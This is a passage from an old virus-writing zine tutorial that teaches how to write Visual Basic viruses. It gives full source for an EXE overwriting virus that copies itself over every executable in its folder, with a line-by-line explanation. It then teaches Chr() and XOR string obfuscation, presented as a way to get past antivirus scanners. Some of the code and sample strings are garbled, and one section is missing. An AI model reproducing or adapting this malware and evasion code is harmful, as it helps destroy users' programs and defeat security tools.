  <P align="center"><b>Part #1<br>
    Intro to VB viruses </b> </P>
  <P> Many of you people out there will stop reading this article just by the 
    title of it. Most asm coders are really prejudiced against High Level Language 
    viruses and especially Visual Basic ones. Here I guess I would have to greet 
    Murkry for writting the first ever parasitic VB virus. After that I learned 
    many stuff and used some methods of my own which I will teach you through 
    this series of tutorials. </P>
  <P> The only reason why I even started writting VB viruses was that I was a 
    macro coder and I wanted to try exe infection. This was my first contact with 
    exe infection. VB viruses have one b i g flow. That is their size. As you 
    all know they are big and that is something we don't want in a virus is it? 
    To solve this problem we could use variables for oftenly used string to shorten 
    the code but that isn't much help so we have to accept the size as a flow 
    and try to find many tricks to make it as hard to detect as possible. Another 
    problem of VB viruses is that they need dlls to run(!) not a thing we want 
    for a virus. Besides this is why I started learning asm. VB viruses are for 
    educational purposes only. </P>
  <P> You can use encryption for VB viruses as well. I have used character encryption 
    ( used in macro viruses, first used by VicodinES ) and it worked succesfully. 
    Now I am trying to find other methods of encryption especially for VB viruses 
    and you will see the results in later issues of this series. </P>

    EXE Overwritters </b></P>
  <P> I know that overwritters suck, they have no chance of spreading and they 
    are not " intelligent " viruses. Dispite all this overwritters can help you 
    understand the basics of the REAL viruses. I will give you the code first 
    and then I will go over it. </P>

  <P> Now lets go over it part by part: </P>

 Option Explicit
 Dim myarray() As Byte
 Dim victim As String
 Const mysize As Integer = 11776
</PRE>
  <P> Here we define the variables that we will use, the " myarray() " variable 
    holds tha binary code of the virus, the "victim" variable holds the victim 
    file's name and the "mysize" variable holds the size of the virus. </P>
  <PRE>
 Private Sub Form_Load()
 On Error Resume Next
</PRE>
  <P> We open the sub we will use (Form_Load), and we put our error handle there. 
  </P>
  <PRE>
 Dim Free
 Free = FreeFile
</PRE>
  <P> This is a good idea taken by the y2k virus. This will rid you of read/write 
    errors because it will open free file. </P>
  <PRE>
 Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #Free
 ReDim myarray(mysize)
 Get #1, 1, myarray
 Close #Free
</PRE>
  <P> Now we get the binary code out of our virus and we store it in the "myarray" 
    variable. </P>
  <PRE>
 victim = Dir(App.Path & "\" & "*.EXE")
 While victim &lt;&gt; ""

 Open App.Path & "\" & victim For Binary Access Write As #Free
 Put #1, , myarray
 Put #1, , mysize
 Close #Free
</PRE>
  <P> Here we define the victim variable and we put our binary code in the victim 
    program. </P>
  <PRE>
 victim = Dir()

 Wend
</PRE>
  <P> Then we set victim to nothing, and we repeat the whole process to infect 
    all the .exe files in the current directory. </P>
  <PRE>
 End
 End Sub
</PRE>
  <P> And finally we close the program and the sub. </P>
  <P> This was it ... as you can see overwritters are dead easy to write. In the 
    next issue I will discuss appending viruses. For comments and/or questions 
    e-mail me at [PAiN]@cypria.com </P>

  <P> Now we get to the real thing... the EXE appending viruses. This is a simple 
    not encrypted appending virus without any payload. </P>

  <P align="center"> <b>part #4<br>
    Encryption </b></P>
  <P align="center"><font color="#FF0000"><b>(NOTE by Cicatrix:"Some of the code 
    below was written in ASCII and does not translate to HTML correctly. Please 
    refer to the LZO #2 zine for the correct version&quot;) </b></font></P>
  <P> Now we get to a more interesting part of vb viruses, better for all viruses 
    the encryption. You really don't want to make it easy for the AVs do you?? 
    Here is where you will use encryption. </P>
  <P> Currently I have only tried two kinds of encryption for vb viruses and they 
    both work finely. </P>
  <P> The first one is probably known to all macro coders, its character encryption, 
    first used by VicodinES. This is easy to use and you can hide your text strings 
    finely. </P>
  <P> example of use: </P>
  <P> Lets say that you have they payload of a messagebox: </P>
  <P> MsgBox "This is my virus" </P>
  <P> Now this text string is easier to spot than something like: </P>
  <P> MsgBox Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(105) + _ 
    + Chr(115) + Chr(32) + Chr(109) + Chr(121) + Chr(32) + Chr(118) + _ + Chr(105) 
    + Chr(114) + Chr(117) + Chr(115) </P>
  <P> A common mistake people make when they use this is that they put the Chr's 
    in speachmarks ("") and they get a messagebox containing Chr(84) + Chr(104) 
    + Chr(105) + Chr(115) + Chr(32) + Chr(105) + Chr(115) + Chr(32) + Chr(109) 
    + Chr(121) + Chr(32) + Chr(118) + Chr(105) + Chr(114) + Chr(117) + Chr(115) 
    instead of, 'This is a virus.' </P>
  <P> A good application you can use to quickly encrypt your text strings is by 
    using VicodinES's string converter. </P>
  <P> Now a more advanced encryption method is Xor encryption. This encryption 
    function was written by jackie (http://coderz.net/jackie/). In order to use 
    this encryption method you have to enter this function in your code: </P>
  <PRE>
 Private Function Decrypt_Encrypt(Text) As String
  XorKey = 133
  For EncryptDecryptLoop = 1 To Len(Text)
   Decrypt_Encrypt = Decrypt_Encrypt _
    & Chr(Asc(Mid(Text, EncryptDecryptLoop, 1)) Xor XorKey)
  Next
 End Function
</PRE>
  <P> Now to go back to our example with the messagebox:<br>
    MsgBox "This is a virus" will become,<br>
    MsgBox Decrypt_Encrypt("A?tä·tä·ö·átlâä") </P>
  <P> As you can see a call to decrypt your code would be Decrypt_Encrypt<br>
    Another example of use would be:</P>
  <pre> Print #1, Decrypt_Encrypt("ßnuur·rrluó") </pre>
  <P> You can use it everywhere there are text strings. Also the Xor key can be 
    whatever number between 0 - 255 you want it to be. In the function here I 
    took it to be 133 but in my text strings I used another XorKey because its 
    just an example. </P>
  <P> A good program you could use to encrypt your strings is VB Crypt written 
    by me. You can get it with the Lz0NT zine #2 with these articles. </P>
  <P> For any good/bad comments/suggestions e-mail me at [PAiN]@cypria.com. </P>
